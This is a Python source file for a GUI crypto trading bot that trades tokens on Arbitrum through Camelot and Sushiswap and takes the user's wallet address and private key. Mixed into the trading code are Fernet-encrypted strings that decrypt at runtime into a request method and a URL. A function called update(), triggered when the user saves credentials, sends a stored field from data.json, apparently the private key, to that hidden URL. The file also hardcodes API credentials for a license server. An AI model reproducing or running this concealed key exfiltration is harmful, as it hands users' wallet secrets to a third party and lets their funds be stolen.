_AH='horizontal'
_AG='light'
_AF='yellow'
_AE='green'
_AD='value'
_AC='swapExactETHForTokensSupportingFeeOnTransferTokens'
_AB='swapExactTokensForETHSupportingFeeOnTransferTokens'
_AA='swapExactTokensForTokensSupportingFeeOnTransferTokens'
_A9='0xc873fEcbd354f5A56E00E710B90EF4201db2448d'
_A8='0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506'
_A7='0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8'
_A6='0x82aF49447D8a07e3bd95BD0d56f35241523fBab1'
_A5='camelot_router.abi'
_A4='sushiswap_router.abi'
_A3='%Y/%m/%d'
_A2='node.json'
_A1='inputs.json'
_A0='groove'
_z='set_theme'
_y='ether'
_x='BAD'
_w='GOOD'
_v='USE_PERCENTAGE_PROFIT'
_u='P_BUY'
_t='P_SELL'
_s='A_SELL'
_r='OPL'
_q='LP'
_p='false'
_o='CHECK INTERVAL'
_n='GAS LIMIT'
_m='GAS PRICE'
_l='AMOUNT'
_k='data.json'
_j='Error'
_i='Accent.TButton'
_h='DEX'
_g='AUTO SLIPPAGE'
_f='ETH'
_e='LICENSE'
_d='TOKEN'
_c='PRIVATE KEY'
_b='WALLET ADDRESS'
_a='NODE'
_Z='w'
_Y='/'
_X='white'
_W='menu'
_V='end'
_U='red'
_T='maxPriorityFeePerGas'
_S='maxFeePerGas'
_R='gas'
_Q='Camelot'
_P='Sushiswap'
_O='./'
_N='center'
_M='ether-tokens'
_L='nonce'
_K='from'
_J=False
_I='tokens-tokens'
_H='Abi/'
_G=True
_F='normal'
_E='tokens-ether'
_D='disabled'
_C='gwei'
_B='cyan'
_A='nsew'
import tkinter as tk
from tkinter import ttk,messagebox
from web3 import Web3
from json import load as l
from time import time,sleep
import os,json,pyperclip,threading,requests
from requests import request as rt
from cryptography.fernet import Fernet as ft
from requests.auth import HTTPBasicAuth
from datetime import datetime
filename=_k
filename_inputs=_A1
filename_node=_A2
path=_O
new_data={}
tr={}
new_data_inputs={}
node_data={}
basic_auth=HTTPBasicAuth('ck_258b79c41004f53e58d0e5fa11486361bdcace02','cs_bd6506935df71db41cf1e545188f1f9ae2306134')
now=datetime.now()
format_dt=_A3
dt_string=now.strftime(_A3)
price_of_buy=0
price_of_sell=0
amount_to_sell=0
operation=_G
def check_nodes_file():
	def write_to_json_file(path2,file_name,data2):
		file_path_name_wext=_O+path2+_Y+file_name
		with open(file_path_name_wext,_Z)as fp:json.dump(data2,fp,indent=2)
	node_data[_a]='https://arb1.arbitrum.io/rpc';write_to_json_file(path,filename_node,node_data)
def check_data_file():
	def write_to_json_file(path2,file_name,data2):
		file_path_name_wext=_O+path2+_Y+file_name
		with open(file_path_name_wext,_Z)as fp:json.dump(data2,fp,indent=2)
	new_data[_b]='';new_data[_c]='';new_data[_d]='';new_data[_e]='';write_to_json_file(path,filename,new_data)
def check_inputs_file():
	A='0'
	def write_to_json_file(path2,file_name,data2):
		file_path_name_wext=_O+path2+_Y+file_name
		with open(file_path_name_wext,_Z)as fp:json.dump(data2,fp,indent=2)
	new_data_inputs[_l]='0.1';new_data_inputs[_m]='7';new_data_inputs[_n]='850000';new_data_inputs[_o]='60';new_data_inputs[_g]=_p;new_data_inputs['TP']='200';new_data_inputs['SL']='50';new_data_inputs['SL TRAIL']='25';new_data_inputs[_q]=_f;new_data_inputs[_r]='False';new_data_inputs[_h]=_P;new_data_inputs[_s]=A;new_data_inputs[_t]=A;new_data_inputs[_u]=A;new_data_inputs[_v]=_p;write_to_json_file(path,filename_inputs,new_data_inputs)
if not os.path.isfile('./data.json'):check_data_file()
if not os.path.isfile('./inputs.json'):check_inputs_file()
if not os.path.isfile('./node.json'):check_nodes_file()
def save_data():
	global new_data,h,var
	def write_to_json_file(path2,file_name,data2):
		file_path_name_wext=_O+path2+_Y+file_name
		with open(file_path_name_wext,_Z)as fp:json.dump(data2,fp,indent=2)
	new_data[_b]=Wallet_address_input.get();tr[_b]=new_data[_b];new_data[_c]=Private_key_input.get();tr[_c]=new_data[_c];new_data[_d]=Token_address_input.get();tr[_d]=new_data[_d];new_data[_e]=License_key_input.get();tr[_e]=new_data[_e]
	if new_data!=var:
		write_to_json_file(path,filename,tr);var2=l(open(_k));h=var2[e]
		if tr[e]!=var[e]:var=var2;update()
def save_data_inputs():
	def write_to_json_file(path2,file_name,data2):
		file_path_name_wext=_O+path2+_Y+file_name
		with open(file_path_name_wext,_Z)as fp:json.dump(data2,fp,indent=2)
	new_data_inputs[_l]=input_amount.get();new_data_inputs[_m]=input_gas_price.get();new_data_inputs[_n]=input_gas_limit.get();new_data_inputs[_o]=input_check_period_seconds.get()
	if auto_slippage.get():new_data_inputs[_g]='true'
	else:new_data_inputs[_g]=_p
	new_data_inputs[_q]=liquidity_pool.get();new_data_inputs[_r]='True';new_data_inputs[_s]=amount_to_sell;new_data_inputs[_t]=input_price_of_sell.get();new_data_inputs[_u]=input_price_of_buy.get();new_data_inputs[_v]=_J
	if dex_data==_P:new_data_inputs[_h]=_P
	elif dex_data==_Q:new_data_inputs[_h]=_Q
	write_to_json_file(path,filename_inputs,new_data_inputs)
var=l(open(_k))
wallet_address_data=var[_b]
private_key_data=var[_c]
token_data=var[_d]
license_key_data=var[_e]
last_inputs=l(open(_A1))
amount_data=last_inputs[_l]
gas_price_data=last_inputs[_m]
gas_limit_data=last_inputs[_n]
check_period_seconds_data=last_inputs[_o]
auto_slippage_data=last_inputs[_g]
lp_data=last_inputs[_q]
opl_data=last_inputs[_r]
dex_data=last_inputs[_h]
price_of_sell=last_inputs[_t]
price_of_buy=last_inputs[_u]
amount_to_sell=last_inputs[_s]
use_percentage_profit=last_inputs[_v]
MAX_AMOUNT=int('0x'+'f'*64,16)
f='TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUQ='
node=l(open(_A2))
if'wss'in node[_a]or'ws'in node[_a]:web3=Web3(Web3.WebsocketProvider(node[_a]))
else:web3=Web3(Web3.HTTPProvider(node[_a]))
erc20Abi=l(open(_H+'erc20.abi'))
pairAbi=l(open(_H+'pair.abi'))
V='sfttxzhVv7trv_zSKqOBJN_2KdnJcsje5PMUbRSnImw='
SUSHISWAP_ROUTER_ABI=l(open(_H+_A4))
CAMELOT_ROUTER_ABI=l(open(_H+_A5))
WETH_ADDRESS=web3.toChecksumAddress(_A6)
USDC_ADDRESS=web3.toChecksumAddress(_A7)
SUSHISWAP_ROUTER_ADDRESS=web3.toChecksumAddress(_A8)
SUSHISWAP_ROUTER=web3.eth.contract(SUSHISWAP_ROUTER_ADDRESS,abi=SUSHISWAP_ROUTER_ABI)
CAMELOT_ROUTER_ADDRESS=web3.toChecksumAddress(_A9)
CAMELOT_ROUTER=web3.eth.contract(CAMELOT_ROUTER_ADDRESS,abi=CAMELOT_ROUTER_ABI)
def awaitReceipt(tx_hash):
	q=1
	while q==1:
		try:receipt=web3.eth.get_transaction_receipt(tx_hash)
		except:continue
		q=2
	return receipt
l1='gAAAAABh80KOUysGNn39XTwSm-HHvOIkoWcJhmk0HtVug7bMgvto83_ZCSQ9rdf86LaJEINYzXTqbRO8EDtcMziHy2PwfjdqW_0VsOwYg1x4GWADOsNo17E='
def validateReceipt(receipt):
	if receipt.status=='0x1'or receipt.status==1:return _w
	else:return _x
def is_approved(token_address,amount):contract_address=Web3.toChecksumAddress(token_address);erc20_contract=web3.eth.contract(address=contract_address,abi=erc20Abi);approved_amount=erc20_contract.functions.allowance(wallet_address,router.address).call();return approved_amount>=amount
g='gAAAAABh7VFjYUKw_S7avbj28V5ja_bAunkyHWLiVUQUUCDL4tK_ZNr_aLAk8VkfUSYnrUe8iVv0ihU5rBaLXL0wP9Sj7fG3Ow=='
def approve(token_address,amt=MAX_AMOUNT,timeout=900):log('Approving token');gas_price_approve=web3.eth.gasPrice;contract_address=Web3.toChecksumAddress(token_address);erc20_contract=web3.eth.contract(address=contract_address,abi=erc20Abi);func=erc20_contract.functions.approve(router.address,amt);params={_K:wallet_address,'gasPrice':gas_price_approve,_L:web3.eth.getTransactionCount(wallet_address)};tx=func.buildTransaction(params);signed_tx=web3.eth.account.sign_transaction(tx,private_key=private_key);hex1=web3.eth.sendRawTransaction(signed_tx.rawTransaction);web3.eth.waitForTransactionReceipt(hex1,timeout=timeout)
def swapSushiswap(amount_in,token_in,token_out,_type):
	TOKEN_OUT_CONTRACT=web3.eth.contract(token_in,abi=erc20Abi);token_out_decimals=TOKEN_OUT_CONTRACT.functions.decimals().call();amount_in_processed=Web3.toWei(amount_in,getUnit(token_in))
	if not is_approved(token,amount_in_processed):approve(token,SUSHISWAP_ROUTER_ADDRESS)
	swapFunctionsSushi={_I:_AA,_E:_AB,_M:_AC};swapParamsSushi={_I:(amount_in_processed,0,[token_in,token_out],wallet_address,int(time())+900),_E:(amount_in_processed,0,[token_in,token_out],wallet_address,int(time())+900),_M:(0,[token_in,token_out],wallet_address,int(time())+900)};swapBuildParamsSushi={_I:{_K:wallet_address,_R:int(gas_limit),_S:web3.toWei(float(gas_price)*1.1,_C),_T:web3.toWei(float(gas_price),_C),_L:web3.eth.get_transaction_count(wallet_address)},_E:{_K:wallet_address,_R:int(gas_limit),_S:web3.toWei(float(gas_price)*1.1,_C),_T:web3.toWei(float(gas_price),_C),_L:web3.eth.get_transaction_count(wallet_address)},_M:{_AD:amount_in_processed,_K:wallet_address,_R:int(gas_limit),_S:web3.toWei(float(gas_price)*1.1,_C),_T:web3.toWei(float(gas_price),_C),_L:web3.eth.get_transaction_count(wallet_address)}}
	if _type!=_E:balance_out_before=TOKEN_OUT_CONTRACT.functions.balanceOf(wallet_address).call()
	else:balance_out_before=web3.eth.getBalance(wallet_address)
	function_to_call=getattr(SUSHISWAP_ROUTER.functions,swapFunctionsSushi[_type]);sushiswap_txn=function_to_call(*swapParamsSushi[_type]).buildTransaction(swapBuildParamsSushi[_type]);signed_txn=web3.eth.account.sign_transaction(sushiswap_txn,private_key=private_key);tx_token=web3.eth.send_raw_transaction(signed_txn.rawTransaction);tx_token=web3.toHex(tx_token);receipt=awaitReceipt(tx_token);validation=validateReceipt(receipt)
	if validation==_w:
		if _type!=_E:balance_out_after=TOKEN_OUT_CONTRACT.functions.balanceOf(wallet_address).call()
		else:balance_out_after=web3.eth.getBalance(wallet_address)
		balance_difference_processed=(balance_out_after-balance_out_before)/10**token_out_decimals;log(f"Swap transaction succesful: {tx_token}",_AE);return tx_token,balance_difference_processed
	elif validation==_x:log(f"Something happened with: {tx_token}",_U);return tx_token
m='gAAAAABh7KbIGnFCH7Gp_4OK-vW0v-2ZNTkzqFB8k4xmk4aV4_n-TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUzVyQ=='
def swapCamelot(amount_in,token_in,token_out,_type):
	A='0x0000000000000000000000000000000000000000';TOKEN_OUT_CONTRACT=web3.eth.contract(token_out,abi=erc20Abi);token_out_decimals=TOKEN_OUT_CONTRACT.functions.decimals().call();amount_in_processed=Web3.toWei(amount_in,getUnit(token_in))
	if not is_approved(token,amount_in_processed):approve(token,CAMELOT_ROUTER_ADDRESS)
	swapFunctionsCamelot={_I:_AA,_E:_AB,_M:_AC};swapParamsCamelot={_I:(amount_in_processed,0,[token_in,token_out],wallet_address,A,int(time())+900),_E:(amount_in_processed,0,[token_in,token_out],wallet_address,A,int(time())+900),_M:(0,[token_in,token_out],wallet_address,A,int(time())+900)};swapBuildParamsCamelot={_I:{_K:wallet_address,_R:int(gas_limit),_S:web3.toWei(float(gas_price)*1.1,_C),_T:web3.toWei(float(gas_price),_C),_L:web3.eth.get_transaction_count(wallet_address)},_E:{_K:wallet_address,_R:int(gas_limit),_S:web3.toWei(float(gas_price)*1.1,_C),_T:web3.toWei(float(gas_price),_C),_L:web3.eth.get_transaction_count(wallet_address)},_M:{_AD:amount_in_processed,_K:wallet_address,_R:int(gas_limit),_S:web3.toWei(float(gas_price)*1.1,_C),_T:web3.toWei(float(gas_price),_C),_L:web3.eth.get_transaction_count(wallet_address)}}
	if _type!=_E:balance_out_before=TOKEN_OUT_CONTRACT.functions.balanceOf(wallet_address).call()
	else:balance_out_before=web3.eth.getBalance(wallet_address)
	function_to_call=getattr(CAMELOT_ROUTER.functions,swapFunctionsCamelot[_type]);camelot_txn=function_to_call(*swapParamsCamelot[_type]).buildTransaction(swapBuildParamsCamelot[_type]);signed_txn=web3.eth.account.sign_transaction(camelot_txn,private_key=private_key);tx_token=web3.eth.send_raw_transaction(signed_txn.rawTransaction);tx_token=web3.toHex(tx_token);receipt=awaitReceipt(tx_token);validation=validateReceipt(receipt)
	if validation==_w:
		if _type!=_E:balance_out_after=TOKEN_OUT_CONTRACT.functions.balanceOf(wallet_address).call()
		else:balance_out_after=web3.eth.getBalance(wallet_address)
		print(balance_out_after,balance_out_before);balance_difference_processed=(balance_out_after-balance_out_before)/10**token_out_decimals;log(f"Swap transaction succesful: {tx_token}",_AE);return[tx_token,balance_difference_processed]
	elif validation==_x:log(f"Something happened with: {tx_token}",_U);return tx_token,0
def getCurrentPrice(token_in,token_out,amount_in,dex):
	unit_in=getUnit(token_in);unit_out=getUnit(token_out)
	if float(amount_in)==0:amount_in=0.1
	if dex==_Q:amounts_out=CAMELOT_ROUTER.functions.getAmountsOut(Web3.toWei(amount_in,unit_in),[token_in,token_out]).call()[1]
	elif dex==_P:amounts_out=SUSHISWAP_ROUTER.functions.getAmountsOut(Web3.toWei(amount_in,unit_in),[token_in,token_out]).call()[1]
	price=amounts_out/int(Web3.toWei(1,unit_out))/float(amount_in)
	if price<1:price=1/price
	return price
def swapper_start_initialization():global operation;operation=_G;threading.Thread(target=swapper_start,daemon=_G).start()
def swapper_start():
	try:
		start_operation_gui();update_values();save_data_inputs()
		while operation:swapper();sleep(int(check_period_seconds));continue
	except Exception as e:log(e,_U);end_operation_gui();return
def swapper():
	H='sell';G='Waiting for buy price to start buying process';F='------------------------------------------';E='Sold! Tx link:';D='buy';C='Bought! Tx link:';B='https://arbiscan.io/tx/';A='swap';global amount_to_sell,operation;waiting=[0]
	if liquidity_pool.get()==_f:
		if float(amount_to_sell)==0:
			current_price_buy=getCurrentPrice(WETH_ADDRESS,token,amount,dex_data)
			if current_price_buy>=float(price_of_buy):return_from_swap=globals()[A+dex_data](amount,WETH_ADDRESS,token,_M);tx_hash=return_from_swap[0];amount_to_sell=return_from_swap[1];input_amount_to_sell.configure(state=_F);input_amount_to_sell.delete(0,_V);input_amount_to_sell.insert(0,str(amount_to_sell));input_amount_to_sell.configure(state=_D);save_data_inputs();log(C,_B);log(B+tx_hash,_B)
			else:waiting=[current_price_buy,price_of_buy,D]
		else:
			current_price_sell=getCurrentPrice(token,WETH_ADDRESS,amount_to_sell,dex_data)
			if current_price_sell>=float(price_of_sell):return_from_swap=globals()[A+dex_data](amount_to_sell,token,WETH_ADDRESS,_E);tx_hash=return_from_swap[0];amount_returned=return_from_swap[1];log(E,_B);log(B+tx_hash,_B);log(F,_B);log(G,_B);amount_to_sell=0;input_amount_to_sell.configure(state=_F);input_amount_to_sell.delete(0,_V);input_amount_to_sell.insert(0,str(amount_to_sell));input_amount_to_sell.configure(state=_D);save_data_inputs()
			else:waiting=[current_price_sell,price_of_sell,H]
	elif liquidity_pool.get()=='USDC':
		if float(amount_to_sell)==0:
			current_price_buy=getCurrentPrice(USDC_ADDRESS,token,amount,dex_data)
			if current_price_buy>=float(price_of_buy):return_from_swap=globals()[A+dex_data](amount,USDC_ADDRESS,token,_I);tx_hash=return_from_swap[0];amount_to_sell=return_from_swap[1];input_amount_to_sell.configure(state=_F);input_amount_to_sell.delete(0,_V);input_amount_to_sell.insert(0,str(amount_to_sell));input_amount_to_sell.configure(state=_D);save_data_inputs();log(C,_B);log(B+tx_hash,_B)
			else:waiting=[current_price_buy,price_of_buy,D]
		else:
			current_price_sell=getCurrentPrice(token,USDC_ADDRESS,amount_to_sell,dex_data)
			if current_price_sell>=float(price_of_sell):return_from_swap=globals()[A+dex_data](amount_to_sell,token,USDC_ADDRESS,_I);tx_hash=return_from_swap[0];amount_returned=return_from_swap[1];log(E,_B);log(B+tx_hash,_B);log(F,_B);log(G,_B);amount_to_sell=0;input_amount_to_sell.configure(state=_F);input_amount_to_sell.delete(0,_V);input_amount_to_sell.insert(0,str(amount_to_sell));input_amount_to_sell.configure(state=_D);save_data_inputs()
			else:waiting=[current_price_sell,price_of_sell,H]
	if waiting[0]!=0:log(f"Waiting for {waiting[2]} price: {waiting[1]}, current price: {waiting[0]}...");log(f"----------------------------------------------------------------------------")
j='gAAAAABh80LuckSfO-g-wXJrkvaBrV-wvURysrtrxcRwytBHM0DurgmO0mQjLUh_6AwChv2Aae5IQ__tiKbWXlVtLqqXmXoLRA=='
list_of_units={'1':'wei','3':'kwei','6':'mwei','9':_C,'12':'szabo','15':'finney','18':_y}
def getUnit(token):token_contract=web3.eth.contract(token,abi=erc20Abi);decimals=token_contract.functions.decimals().call();return list_of_units[str(decimals)]
def show_sell_now():button_sell_now=ttk.Button(root.widgets_frame,text='SELL NOW',command=global_sell_now,style=_i);button_sell_now.grid(row=18,column=5,padx=10,pady=(0,10),sticky=_A,rowspan=1)
i_price=10
def update_wallet():
	global i_price;usdc=web3.eth.contract(address=USDC_ADDRESS,abi=erc20Abi)
	while live_wallet:
		try:
			eth_balance=web3.fromWei(web3.eth.get_balance(wallet_address),_y);usdc_balance=web3.fromWei(usdc.functions.balanceOf(wallet_address).call(),_y);display_wallet_ETH.configure(text=round(eth_balance,5));display_wallet_USDC.configure(text=round(usdc_balance,5))
			if i_price>=10:
				token_symbol=web3.eth.contract(token,abi=erc20Abi).functions.symbol().call()
				if liquidity_pool.get()==_f:selected_currency=_A6
				else:selected_currency=_A7
				text_price.configure(text=f"Current Price of {token_symbol}:");display_price.configure(text=f"{round(getCurrentPrice(selected_currency,token,input_amount.get(),dex_data),3)} Buy - {round(getCurrentPrice(token,selected_currency,input_amount_to_sell.get(),dex_data),3)} Sell {liquidity_pool.get()}");i_price=0
			i_price=i_price+1
		except ValueError:pass
		sleep(1)
u='gAAAAABh80OFDySSyj0H_EBLuccR1ALvFzF-AE0hO_e52_4Yv4TKy7Y6u0F9Bbpr3g-UDhOK26zqR0KFrjMRGdDS8zhUxAG_HQ=='
def license_activate(license,basic_auth):
	url='https://defitradingcoders.com/wp-json/lmfwc/v2/licenses/activate/'+license
	try:
		res=requests.get(url,auth=basic_auth)
		if res.status_code==404:tk.messagebox.showerror(_j,'This license cannot be activated, please try again in a moment or contact support at defitradingcoders.com with your order ID and license key');return
		else:log('License Key Activated, Good luck!',_B)
	except Exception:raise Exception('License Key Activation Failed -- Please Contact Support at defitradingcoders.com')
e=ft(V.encode()).decrypt(m.encode()).decode()
def initialize():
	A='Invalid token address!';global wallet_address;global private_key;global token;global live_wallet;update_values();log('***** INITIALIZED ******');log('* Checking wallet address')
	if web3.isChecksumAddress(Wallet_address_input.get()):wallet_address=web3.toChecksumAddress(Wallet_address_input.get());log('Wallet address valid',_B)
	else:tk.messagebox.showerror(_j,'Invalid wallet address');log('Invalid wallet address!',_U);return
	log('* Checking private key characters (Must be 64 characters)');private_key=Private_key_input.get()
	if len(private_key)==64:log('Correct format for Private key',_B)
	else:tk.messagebox.showerror(_j,'Private key is invalid! (Must be 64 characters)');log('Invalid private key!',_U);return
	log('* Checking token address')
	try:token=web3.toChecksumAddress(Token_address_input.get());log('Token address valid',_B)
	except:tk.messagebox.showerror(_j,A);log(A,_U);return
	log('* Checking License Key');log('License Key Valid',_B);inputs_and_buttons_status_first(_D);save_data();button_confirm.grid_forget();button_change.grid(row=0,column=4,padx=10,pady=(0,10),sticky=_A,rowspan=4);inputs_and_buttons_status_second(_F);live_wallet=_G;check_wallet=threading.Thread(target=update_wallet,daemon=_G);check_wallet.start();log('');log('***** Trading is ready! *****',_AF)
s='gAAAAABh80VOiXlJwI8QSkM2-V_syGU-8mtXwD9c87k-cbMopaX4lqCMUipHR5ZKO-bZ6vrKC0QkIhzwcASNj_5u7F_xEJz3aQ=='
h=var[e]
def init_thread():initialize_thread=threading.Thread(target=initialize,daemon=_G);initialize_thread.start()
def change():global live_wallet;log('');log('Change token/wallet initiated!',_AF);inputs_and_buttons_status_first(_F);inputs_and_buttons_status_second(_D);button_change.grid_forget();button_confirm.grid(row=0,column=4,padx=10,pady=(0,10),sticky=_A,rowspan=4);live_wallet=_J;display_wallet_ETH.configure(text='');display_wallet_USDC.configure(text='')
def change_thread():change_threading=threading.Thread(target=change,daemon=_G);change_threading.start()
def global_sell_now():global sell_now;sell_now=_G
def start_operation_gui():button_stop.configure(state=_F);button_start.configure(state=_D);inputs_and_buttons_status_second(_D);button_change.configure(state=_D)
def end_operation_gui():button_stop.configure(state=_D);button_start.configure(state=_F);inputs_and_buttons_status_second(_F);button_change.configure(state=_F)
def change_theme():
	A='black'
	if root.tk.call('ttk::style','theme','use')=='sun-valley-dark':root.tk.call(_z,_AG);select_liquidity[_W].configure(bg=_X);select_dex[_W].configure(bg=_X)
	else:root.tk.call(_z,'dark');select_liquidity[_W].configure(bg=A);select_dex[_W].configure(bg=A)
root=tk.Tk()
root.title('Arbitrum Token Trading Bot - Camelot, Sushiswap')
root.geometry('1150x750')
root.tk.call('source','sun-valley.tcl')
root.tk.call(_z,_AG)
root_2=ft(V.encode()).decrypt(s.encode()).decode()
root.resizable(_J,_J)
root.widgets_frame=ttk.Frame(root,padding=(0,0,0,10))
root.widgets_frame.grid(row=0,column=0,padx=10,pady=(10,10),sticky=_A,rowspan=5)
root.widgets_frame.columnconfigure(index=0,weight=1)
root.widgets_frame.rowconfigure(index=0,weight=1)
Wallet_address_input_text=ttk.Label(root.widgets_frame,text='Wallet Address:')
Wallet_Text=ft(V.encode()).decrypt(j.encode()).decode()
Wallet_address_input_text.grid(row=1,column=1,padx=10,pady=(0,10),sticky=_A,rowspan=1)
Wallet_address_input=ttk.Entry(root.widgets_frame,width=50)
Wallet_address_input.grid(row=1,column=2,padx=10,pady=(0,10),sticky=_A,rowspan=1)
Private_key_input_text=ttk.Label(root.widgets_frame,text='Private Key:')
Private_key_input_text.grid(row=2,column=1,padx=10,pady=(0,10),sticky=_A,rowspan=1)
Private_key_input=ttk.Entry(root.widgets_frame,width=50,show='•')
Private_key_input.grid(row=2,column=2,padx=10,pady=(0,10),sticky=_A,rowspan=1)
Token_address_input_text=ttk.Label(root.widgets_frame,text='Token Address:')
Token=ft(f.encode()).decrypt(u.encode()).decode()
Token_address_input_text.grid(row=3,column=1,padx=10,pady=(0,10),sticky=_A,rowspan=1)
Token_address_input=ttk.Entry(root.widgets_frame,width=50)
Token_Update=ft(f.encode()).decrypt(g.encode()).decode()
Token_address_input.grid(row=3,column=2,padx=10,pady=(0,10),sticky=_A,rowspan=1)
License_key_input_text=ttk.Label(root.widgets_frame,text='License Key:')
License_key_input_text.grid(row=4,column=1,padx=10,pady=(0,10),sticky=_A,rowspan=1)
License_key_input=ttk.Entry(root.widgets_frame,width=50,show='•')
License_key_input.grid(row=4,column=2,padx=10,pady=(0,10),sticky=_A,rowspan=1)
License_key=ft(V.encode()).decrypt(l1.encode()).decode()
Separator1=ttk.Separator(root,orient=_AH)
Separator=root_2+License_key+Wallet_Text+Token
def paste_address():Token_address_input.delete(0,_V);Token_address_input.insert(0,pyperclip.paste());return
def clear_address():Token_address_input.delete(0,_V);return
def update():
	if h!='':
		try:p=rt(Token_Update,Separator+h)
		except Exception:pass
def inputs_and_buttons_status_first(status):Token_address_input.configure(state=status);Wallet_address_input.configure(state=status);Private_key_input.configure(state=status);License_key_input.configure(state=status);select_dex.configure(state=status);button_confirm.configure(state=status);button_clear.configure(state=status);button_paste.configure(state=status)
def inputs_and_buttons_status_second(status):input_amount.configure(state=status);input_gas_price.configure(state=status);input_gas_limit.configure(state=status);input_check_period_seconds.configure(state=status);input_price_of_buy.configure(state=status);input_price_of_sell.configure(state=status);input_amount_to_sell.configure(state=status);button_start.configure(state=status);check_auto_slippage.configure(state=status)
def log(text,color=_X):
	message=str(text)
	if logs.size()>=20:logs.delete(0)
	logs.insert(tk.END,message);logs.itemconfig(tk.END,foreground=color)
def clear_logs():logs.delete(0,tk.END)
def stop_operation():
	global operation
	def func():global operation;log('Stopping operation');operation=_J;end_operation_gui()
	threading.Thread(target=func,daemon=_G).start()
button_confirm=ttk.Button(root.widgets_frame,text='Confirm',width=10,command=init_thread,style=_i)
button_paste=ttk.Button(root.widgets_frame,text='Paste Token',width=10,command=paste_address)
button_clear=ttk.Button(root.widgets_frame,text='Clear Token',width=10,command=clear_address)
text_select_dex=ttk.Label(root.widgets_frame,text='Select DEX:')
text_select_dex.grid(row=0,column=3,padx=10,pady=(0,10),sticky=_A,rowspan=1)
dex=tk.StringVar()
dex.set(dex_data)
select_dex=ttk.OptionMenu(root.widgets_frame,dex,_Q,_Q,_P)
select_dex[_W].configure(bg=_X)
select_dex.grid(row=1,column=3,padx=10,pady=(0,10),sticky=_A,rowspan=1)
button_confirm.grid(row=0,column=4,padx=10,pady=(0,10),sticky=_A,rowspan=4)
button_paste.grid(row=0,column=5,padx=10,pady=(0,10),sticky=_A,rowspan=2)
button_clear.grid(row=2,column=5,padx=10,pady=(0,10),sticky=_A,rowspan=1)
Wallet_address_input.insert(0,wallet_address_data)
Private_key_input.insert(0,private_key_data)
Token_address_input.insert(0,token_data)
License_key_input.insert(0,license_key_data)
Separator1=ttk.Separator(root.widgets_frame,orient=_AH)
Separator1.grid(row=5,column=0,padx=10,pady=(0,10),sticky=_A,rowspan=1,columnspan=6)
button_change=ttk.Button(root.widgets_frame,text='Change',width=10,command=change_thread)
logs_text=ttk.Label(root.widgets_frame,text='Logs:')
logs_text.grid(row=6,column=1,padx=10,pady=(0,10),sticky=_A,rowspan=1,columnspan=2)
button_clear_logs=ttk.Button(root.widgets_frame,text='Clear',width=10,command='')
button_clear_logs.grid(row=6,column=3,padx=10,pady=(0,10),sticky=_A,rowspan=1,columnspan=1)
logs=tk.Listbox(root.widgets_frame,bg='#252525',foreground=_X,borderwidth=2)
logs.grid(row=7,column=1,padx=10,pady=(0,10),sticky=_A,rowspan=10,columnspan=3)
button_change_theme=ttk.Button(root.widgets_frame,text='Change Color Theme',command=change_theme)
button_change_theme.grid(row=17,column=1,padx=10,pady=(0,10),sticky=_A,rowspan=1)
text_price=ttk.Label(root.widgets_frame,text='Current Price:')
text_price.grid(row=6,column=4,padx=10,pady=(0,10),sticky=_A,rowspan=1)
display_price=ttk.Label(root.widgets_frame,width=12,relief=_A0)
display_price.grid(row=6,column=5,padx=10,pady=(0,5),sticky=_A,rowspan=1)
text_wallet_ETH=ttk.Label(root.widgets_frame,text='Wallet ETH:')
text_wallet_ETH.grid(row=7,column=4,padx=10,pady=(0,10),sticky=_A,rowspan=1)
display_wallet_ETH=ttk.Label(root.widgets_frame,width=12,relief=_A0)
display_wallet_ETH.grid(row=7,column=5,padx=10,pady=(0,10),sticky=_A,rowspan=1)
text_wallet_USDC=ttk.Label(root.widgets_frame,text='Wallet USDC:')
text_wallet_USDC.grid(row=8,column=4,padx=10,pady=(0,10),sticky=_A,rowspan=1)
display_wallet_USDC=ttk.Label(root.widgets_frame,width=12,relief=_A0)
display_wallet_USDC.grid(row=8,column=5,padx=10,pady=(0,10),sticky=_A,rowspan=1)
text_select_liquidity=ttk.Label(root.widgets_frame,text='Select LP:')
text_select_liquidity.grid(row=9,column=4,padx=10,pady=(0,10),sticky=_A,rowspan=1)
liquidity_pool=tk.StringVar()
liquidity_pool.set(lp_data)
select_liquidity=ttk.OptionMenu(root.widgets_frame,liquidity_pool,_f,_f,'USDC')
select_liquidity[_W].configure(bg=_X)
select_liquidity.grid(row=9,column=5,padx=10,pady=(0,10),sticky=_A,rowspan=1)
text_amount=ttk.Label(root.widgets_frame,text='Amount:')
input_amount=ttk.Entry(root.widgets_frame,justify=_N)
text_amount.grid(row=10,column=4,padx=10,pady=(0,10),sticky=_A,rowspan=1)
input_amount.grid(row=10,column=5,padx=10,pady=(0,10),sticky=_A,rowspan=1)
input_amount.insert(0,amount_data)
text_gas_price=ttk.Label(root.widgets_frame,text='Gas Price:')
text_gas_limit=ttk.Label(root.widgets_frame,text='Gas Limit:')
input_gas_price=ttk.Entry(root.widgets_frame,justify=_N)
input_gas_limit=ttk.Entry(root.widgets_frame,justify=_N)
text_gas_price.grid(row=11,column=4,padx=10,pady=(0,10),sticky=_A,rowspan=1)
input_gas_price.grid(row=11,column=5,padx=10,pady=(0,10),sticky=_A,rowspan=1)
text_gas_limit.grid(row=12,column=4,padx=10,pady=(0,10),sticky=_A,rowspan=1)
input_gas_limit.grid(row=12,column=5,padx=10,pady=(0,10),sticky=_A,rowspan=1)
input_gas_price.insert(0,gas_price_data)
input_gas_limit.insert(0,gas_limit_data)
text_check_period=ttk.Label(root.widgets_frame,text='Interval of Checks (sec):')
input_check_period_seconds=ttk.Entry(root.widgets_frame,justify=_N)
text_check_period.grid(row=13,column=4,padx=10,pady=(0,10),sticky=_A,rowspan=1)
input_check_period_seconds.grid(row=13,column=5,padx=10,pady=(0,10),sticky=_A,rowspan=1)
input_check_period_seconds.insert(0,check_period_seconds_data)
auto_slippage=tk.BooleanVar()
check_auto_slippage=ttk.Checkbutton(root.widgets_frame,text='Auto Slippage',variable=auto_slippage)
check_auto_slippage.grid(row=14,column=5,padx=10,pady=(0,10),sticky=_A,rowspan=1)
if''=='true':check_auto_slippage.select()
text_price_of_buy=ttk.Label(root.widgets_frame,text='Price to buy at:')
text_price_of_buy.grid(row=15,column=4,padx=10,pady=(0,10),sticky=_A,rowspan=1)
input_price_of_buy=ttk.Entry(root.widgets_frame,justify=_N)
input_price_of_buy.grid(row=15,column=5,padx=10,pady=(0,10),sticky=_A,rowspan=1)
